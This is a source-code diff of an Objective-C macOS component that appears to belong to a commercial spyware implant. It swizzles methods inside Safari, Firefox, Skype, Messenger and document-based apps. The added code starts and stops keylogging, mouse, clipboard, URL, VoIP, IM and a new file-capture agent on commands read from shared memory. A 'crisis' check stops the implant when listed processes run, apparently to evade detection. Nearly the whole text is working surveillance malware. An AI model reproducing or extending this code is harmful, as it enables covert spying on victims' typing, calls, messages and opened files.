@@ -23,15 +23,14 @@
 #import <dlfcn.h>
 
 #import "mach_override.h"
-#import "RCSMConfManager.h"
+#import "RCSMAgentURL.h"
 #import "RCSMInputManager.h"
 #import "RCSMAgentVoipSkype.h"
 #import "RCSMAgentApplication.h"
-
+#import "RCSMAgentFileCapture.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
-
 
 #define swizzleMethod(c1, m1, c2, m2) do { \
           method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
@@ -64,6 +63,7 @@ static int imFlag           = 0;
 static int clipboardFlag    = 0;
 static int voipFlag         = 0;
 static int appFlag          = 0;
+static int fileFlag         = 0;
 
 NSDictionary *getActiveWindowInformationForPID(pid_t pid)
 {
@@ -560,6 +560,246 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
 }
 
++ (void)checkAgentAtOffset: (uint32_t)offset
+{
+  NSMutableData *readData;
+  shMemoryCommand *shMemCommand;
+  NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
+  
+  readData = [mSharedMemoryCommand readMemory: offset
+                                fromComponent: COMP_AGENT];
+  shMemCommand = (shMemoryCommand *)[readData bytes];
+
+  if (readData != nil)
+    {
+      switch (offset)
+        {
+        case OFFT_URL:
+          {
+            if (urlFlag == 0
+                && shMemCommand->command == AG_START)
+              {
+                if ([identifier isCaseInsensitiveLike: @"com.apple.safari"] ||
+                    [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    infoLog(@"Starting Agent URL");
+#endif
+                    urlFlag = 1;
+                  }
+                else
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    verboseLog(@"Skipping (%@) for URL", identifier);
+#endif
+                  }
+              }
+            else if ((urlFlag == 1 || urlFlag == 2)
+                      && shMemCommand->command == AG_STOP)
+              {
+                if ([identifier isCaseInsensitiveLike: @"com.apple.safari"] ||
+                    [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    infoLog(@"Stopping Agent URL");
+#endif
+                    urlFlag = 3;
+                  }
+                else
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    verboseLog(@"Skipping (%@) for URL", identifier);
+#endif
+                  }
+              }
+          } break;
+        case OFFT_APPLICATION:
+          {
+            if (appFlag == 0
+                && shMemCommand->command == AG_START)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Starting Agent Application");
+#endif
+                appFlag = 1;
+              }
+            else if ((appFlag == 1 || appFlag == 2)
+                     && shMemCommand->command == AG_STOP)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Stopping Agent Application");
+#endif
+                appFlag = 3;
+              }
+          } break;
+        case OFFT_KEYLOG:
+          {
+            if (keyboardFlag == 0
+                && shMemCommand->command == AG_START)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Starting Agent Keylog");
+#endif
+                keyboardFlag = 1;
+              }
+            else if ((keyboardFlag == 1 || keyboardFlag == 2)
+                     && shMemCommand->command == AG_STOP)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Stopping Agent Keylog");
+#endif
+                keyboardFlag = 3;
+              }
+          } break;
+        case OFFT_MOUSE:
+          {
+            if (mouseFlag == 0
+                && shMemCommand->command == AG_START)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Starting Agent Mouse");
+#endif
+                mouseFlag = 1;
+              }
+            else if ((mouseFlag == 1 || mouseFlag == 2)
+                     && shMemCommand->command == AG_STOP)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Stopping Agent Mouse");
+#endif
+                mouseFlag = 3;
+              }
+          } break;
+        case OFFT_VOIP:
+          {
+            if (voipFlag == 0
+                && shMemCommand->command == AG_START)
+              {
+                if ([identifier isCaseInsensitiveLike: @"com.skype.skype"])
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    infoLog(@"Starting Agent VOIP");
+#endif
+                    voipFlag = 1;
+                  }
+                else
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    verboseLog(@"Skipping (%@) for VOIP", identifier);
+#endif
+                  }
+              }
+            else if ((voipFlag == 1 || voipFlag == 2)
+                     && shMemCommand->command == AG_STOP)
+              {
+                if ([identifier isCaseInsensitiveLike: @"com.skype.skype"])
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    infoLog(@"Stopping Agent VOIP");
+#endif
+                    voipFlag = 3;
+                  }
+                else
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    verboseLog(@"Skipping (%@) for VOIP", identifier);
+#endif
+                  }
+              } 
+          } break;
+        case OFFT_IM:
+          {
+            if (imFlag == 0
+                && shMemCommand->command == AG_START)
+              {
+                if ([identifier isCaseInsensitiveLike: @"com.microsoft.messenger"]
+                    || [identifier isCaseInsensitiveLike: @"com.skype.skype"])
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    infoLog(@"Starting Agent IM");
+#endif
+                    imFlag = 1;
+                  }
+                else
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    verboseLog(@"Skipping (%@) for IM", identifier);
+#endif
+                  }
+              }
+            else if ((imFlag == 1 || imFlag == 2)
+                     && shMemCommand->command == AG_STOP)
+              {
+                if ([identifier isCaseInsensitiveLike: @"com.microsoft.messenger"]
+                    || [identifier isCaseInsensitiveLike: @"com.skype.skype"])
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    infoLog(@"Stopping Agent IM");
+#endif
+                    imFlag = 3;
+                  }
+                else
+                  {
+#ifdef DEBUG_INPUT_MANAGER
+                    verboseLog(@"Skipping (%@) for IM", identifier);
+#endif
+                  }
+              }
+          } break;
+        case OFFT_CLIPBOARD:
+          {
+            if (clipboardFlag == 0
+                && shMemCommand->command == AG_START)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Starting Agent Clipboard");
+#endif
+                clipboardFlag = 1;
+              }
+            else if ((clipboardFlag == 1 || clipboardFlag == 2)
+                     && shMemCommand->command == AG_STOP)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Stopping Agent Clipboard");
+#endif
+                clipboardFlag = 3;
+              }
+          } break;
+        case OFFT_FILECAPTURE:
+          {
+            if (fileFlag == 0
+                && shMemCommand->command == AG_START)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Starting Agent FileCapture");
+#endif
+                fileFlag = 1;
+              }
+            else if ((fileFlag == 1 || fileFlag == 2)
+                      && shMemCommand->command == AG_STOP)
+              {
+#ifdef DEBUG_INPUT_MANAGER
+                infoLog(@"Stopping Agent FileCapture");
+#endif
+                fileFlag = 3;
+              }
+          } break;
+        default:
+          {
+#ifdef DEBUG_INPUT_MANAGER
+            errorLog(@"Invalid offset 0x%x", offset);
+#endif
+          }
+        }
+    }
+  else
+    {
+#ifdef DEBUG_INPUT_MANAGER
+      verboseLog(@"data is nil at offset 0x%x", offset);
+#endif
+    }
+}
+
 + (void)startThreadCommunicator: (NSNotification *)_notification
 {
 #ifdef DEBUG_INPUT_MANAGER
@@ -645,6 +885,73 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   [pool release];
 }
 
++ (BOOL)isACrisisApp
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableData *readData;
+  shMemoryCommand *shMemCommand;
+  BOOL retVal = NO;
+  NSProcessInfo *pi = [NSProcessInfo processInfo];  
+  NSString *appName = [pi processName];
+
+#ifdef DEBUG_INPUT_MANAGER
+  infoLog(@"Crisis appName %@", appName);  
+#endif
+  
+  readData = [mSharedMemoryCommand readMemory: OFFT_CRISIS
+                                fromComponent: COMP_AGENT];
+  
+  if (readData == nil)
+    return retVal;
+  
+  shMemCommand = (shMemoryCommand *)[readData bytes];
+  
+#ifdef DEBUG_INPUT_MANAGER
+  infoLog(@"Crisis commandData %@", readData);  
+#endif
+  
+  if (shMemCommand->command == AG_START &&
+      shMemCommand->commandDataSize)
+  {
+    NSData *tmpListData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
+                                                 length: shMemCommand->commandDataSize];
+    UInt32 numOfNames;
+    
+    [tmpListData getBytes: &numOfNames length: sizeof(UInt32)];
+    
+    char* tmpPtr = ((char*)[tmpListData bytes]) + sizeof(UInt32);
+    
+    for (int i=0; i < numOfNames; i++)
+    {
+      int iLen = _utf16len((unichar*)tmpPtr)*sizeof(unichar);
+      NSString *tmpCrisisApp = [[NSString alloc] initWithBytes: tmpPtr 
+                                                        length: iLen 
+                                                      encoding: NSUTF16LittleEndianStringEncoding];
+      
+      
+#ifdef DEBUG_INPUT_MANAGER
+      infoLog(@"AppName %@", tmpCrisisApp);  
+#endif
+      
+      if ([appName isCaseInsensitiveLike: tmpCrisisApp])
+      {
+        [tmpCrisisApp release];
+        retVal = YES;
+        break;
+      }
+      
+      [tmpCrisisApp release];
+      
+      tmpPtr += iLen;
+    }
+  }
+  
+  [pool release];
+  
+  return retVal;
+}
+
 + (void)startCoreCommunicator
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -662,6 +969,18 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
   
   usleep(500000);
+
+  
+  // Only for input manager
+  if (gOSMajor    == 10 &&
+      gOSMinor == 5 &&
+      [self isACrisisApp])
+  {
+#ifdef DEBUG_INPUT_MANAGER
+    infoLog(@"Crisis is started and app match exit now!");  
+#endif
+    return;
+  }
   
 #ifdef DEBUG_INPUT_MANAGER
   infoLog(@"Core Communicator thread launched");  
@@ -686,151 +1005,16 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   while (isAppRunning == YES)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      NSMutableData *readData;
-      shMemoryCommand *shMemCommand;
       
-      // Silly Code but it's faster than a switch/case inside a loop
-      readData = [mSharedMemoryCommand readMemory: OFFT_URL
-                                    fromComponent: COMP_AGENT];
-      
-      if (readData != nil)
-        {
-          shMemCommand = (shMemoryCommand *)[readData bytes];
-          
-          if (urlFlag == 0 && shMemCommand->command == AG_START)
-            {
-#ifdef DEBUG_INPUT_MANAGER
-              infoLog(@"Started URL Agent");
-#endif
-              urlFlag = 1;
-            }
-          else if (urlFlag == 1 || urlFlag == 2 && shMemCommand->command == AG_STOP)
-            urlFlag = 3;
-          
-          //[readData release];
-        }
-         
-      readData = [mSharedMemoryCommand readMemory: OFFT_APPLICATION
-                                    fromComponent: COMP_AGENT];
-      
-      if (readData != nil)
-        {
-          shMemCommand = (shMemoryCommand *)[readData bytes];
+      [self checkAgentAtOffset: OFFT_URL];
+      [self checkAgentAtOffset: OFFT_APPLICATION];
+      [self checkAgentAtOffset: OFFT_KEYLOG];
+      [self checkAgentAtOffset: OFFT_MOUSE];
+      [self checkAgentAtOffset: OFFT_VOIP];
+      [self checkAgentAtOffset: OFFT_IM];
+      [self checkAgentAtOffset: OFFT_CLIPBOARD];
+      [self checkAgentAtOffset: OFFT_FILECAPTURE];
 
-          if (appFlag == 0
-              && shMemCommand->command == AG_START)
-            {
-#ifdef DEBUG_INPUT_MANAGER
-              infoLog(@"Starting Agent Application");
-#endif
-
-              appFlag = 1;
-            }
-          else if ((appFlag == 1 || appFlag == 2)
-                   && shMemCommand->command == AG_STOP)
-            {
-#ifdef DEBUG
-              infoLog(@"Stopping Agent Application");
-#endif
-
-              appFlag = 3;
-            }
-
-          //[readData release];
-        }
-      
-      readData = [mSharedMemoryCommand readMemory: OFFT_KEYLOG
-                                    fromComponent: COMP_AGENT];
-      if (readData != nil)
-        {
-          shMemCommand = (shMemoryCommand *)[readData bytes];
-          
-          if (keyboardFlag == 0
-              && shMemCommand->command == AG_START)
-              //&& ([bundleIdentifier isEqualToString: @"com.apple.Safari"] == FALSE)
-              //&& ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == FALSE))
-            {
-              keyboardFlag = 1;
-            }
-          else if ((keyboardFlag == 1
-                   || keyboardFlag == 2)
-                   && shMemCommand->command == AG_STOP)
-                   //&& ([bundleIdentifier isEqualToString: @"com.apple.Safari"] == FALSE)
-                   //&& ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == FALSE))
-            {
-              keyboardFlag = 3;
-            }
-          
-          //[readData release];
-        }
-      
-      readData = [mSharedMemoryCommand readMemory: OFFT_MOUSE
-                                    fromComponent: COMP_AGENT];
-      if (readData != nil)
-        {
-          shMemCommand = (shMemoryCommand *)[readData bytes];
-          
-          if (mouseFlag == 0
-              && shMemCommand->command == AG_START)
-              //&& ([bundleIdentifier isEqualToString: @"com.apple.Safari"] == FALSE)
-              //&& ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == FALSE))
-            {
-              mouseFlag = 1;
-            }
-          else if ((mouseFlag == 1
-                   || mouseFlag == 2)
-                   && shMemCommand->command == AG_STOP)
-                   //&& ([bundleIdentifier isEqualToString: @"com.apple.Safari"] == FALSE)
-                   //&& ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == FALSE))
-            {
-              mouseFlag = 3;
-            }
-          
-          //[readData release];
-        }
-      
-      readData = [mSharedMemoryCommand readMemory: OFFT_VOIP
-                                    fromComponent: COMP_AGENT];
-      if (readData != nil)
-        {
-          shMemCommand = (shMemoryCommand *)[readData bytes];
-          
-          if (voipFlag == 0 && shMemCommand->command == AG_START)
-            voipFlag = 1;
-          else if (voipFlag == 1 || voipFlag == 2 && shMemCommand->command == AG_STOP)
-            voipFlag = 3;
-          
-          //[readData release];
-        }
-      
-      readData = [mSharedMemoryCommand readMemory: OFFT_IM
-                                    fromComponent: COMP_AGENT];
-      if (readData != nil)
-        {
-          shMemCommand = (shMemoryCommand *)[readData bytes];
-          
-          if (imFlag == 0 && shMemCommand->command == AG_START)
-            imFlag = 1;
-          else if (imFlag == 1 || imFlag == 2 && shMemCommand->command == AG_STOP)
-            imFlag = 3;
-          
-          //[readData release];
-        }
-      
-      readData = [mSharedMemoryCommand readMemory: OFFT_CLIPBOARD
-                                    fromComponent: COMP_AGENT];
-      if (readData != nil)
-        {
-          shMemCommand = (shMemoryCommand *)[readData bytes];
-          
-          if (clipboardFlag == 0 && shMemCommand->command == AG_START)
-            clipboardFlag = 1;
-          else if (clipboardFlag == 1 || clipboardFlag == 2 && shMemCommand->command == AG_STOP)
-            clipboardFlag = 3;
-          
-          //[readData release];
-        }
-      
       //
       // Perform swizzle here
       //
@@ -845,7 +1029,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           // Safari
           //
           usleep(2000000);
-                        
+          URLStartAgent();
+
           Class className   = objc_getClass("BrowserWindowController");
           Class classSource = objc_getClass("myBrowserWindowController");
         
@@ -861,8 +1046,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
               warnLog(@"URL - not the right application, skipping");
 #endif
             }
+
           // End of Safari
-          /*
+
           //
           // Firefox 3 - Massimo Chiodini
           //
@@ -888,8 +1074,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                             className, @selector(setTitleHook:));
               
             }
-           */
+
           // End of Firefox 3
+
         }
       else if (urlFlag == 3)
         {
@@ -902,9 +1089,11 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           
           if (className != nil)
             {
-              swizzleByAddingIMP (className, @selector(webFrameLoadCommitted:),
-                                  class_getMethodImplementation(className, @selector(webFrameLoadCommittedHook:)),
-                                  @selector(webFrameLoadCommittedHook:));
+              //swizzleByAddingIMP (className, @selector(webFrameLoadCommitted:),
+                                  //class_getMethodImplementation(className, @selector(webFrameLoadCommittedHook:)),
+                                  //@selector(webFrameLoadCommittedHook:));
+              swizzleMethod(className, @selector(webFrameLoadCommitted:),
+                            className, @selector(webFrameLoadCommittedHook:));
             }
           else
             {
@@ -914,7 +1103,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             }
         
           // firefox 3
-          /*
+
           NSString *application_name  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
           NSString *firefox_app       = [[NSString alloc] initWithUTF8String: "Firefox.app"];
           
@@ -926,12 +1115,14 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                                                         options: NSCaseInsensitiveSearch
                                                           range: strRange
                                                          locale: [NSLocale currentLocale]];
-          
+#ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Comparing %@ vs. %@ (%d)", application_name, firefox_app, firefox_res);
-          
+#endif      
           if(firefox_res == NSOrderedSame)
             {
+#ifdef DEBUG_INPUT_MANAGER
               infoLog(@"Hooking fairfocs baby!");
+#endif
               
               Class className = objc_getClass("NSWindow");
               
@@ -939,7 +1130,6 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                             className, @selector(setTitleHook:));
               
             }
-          */
         }
       
       if (appFlag == 1)
@@ -1331,17 +1521,54 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             }
         }
       
+      if (fileFlag == 1)
+        {
+          fileFlag = 2;
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"Hooking for file capture");
+#endif
+
+          Class className   = objc_getClass("NSDocumentController");
+          Class classSource = objc_getClass("myNSDocumentController");
+
+          swizzleByAddingIMP(className,
+                             @selector(openDocumentWithContentsOfURL:display:error:),
+                             class_getMethodImplementation(classSource,
+                                                @selector(openDocumentWithContentsOfURLHook:display:error:)),
+                             @selector(openDocumentWithContentsOfURLHook:display:error:));
+
+          FCStartAgent();
+        }
+      else if (fileFlag == 3)
+        {
+          fileFlag = 0;
+
+          FCStopAgent();
+          
+          Class className   = objc_getClass("NSDocumentController");
+          Class classSource = objc_getClass("myNSDocumentController");
+
+          swizzleByAddingIMP(className,
+                             @selector(openDocumentWithContentsOfURL:display:error:),
+                             class_getMethodImplementation(classSource,
+                             @selector(openDocumentWithContentsOfURLHook:display:error:)),
+                             @selector(openDocumentWithContentsOfURLHook:display:error:));
+
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"Unhooking for file capture");
+#endif
+        }
+
       usleep(8000);
-      
       [innerPool release];
     }
-  /*
-  [mSharedMemoryCommand detachFromMemoryRegion];
-  [mSharedMemoryCommand release];
+
+  //[mSharedMemoryCommand detachFromMemoryRegion];
+  //[mSharedMemoryCommand release];
   
-  [mSharedMemoryLogging detachFromMemoryRegion];
-  [mSharedMemoryLogging release];
-  */
+  //[mSharedMemoryLogging detachFromMemoryRegion];
+  //[mSharedMemoryLogging release];
+
   [pool release];
 }
 
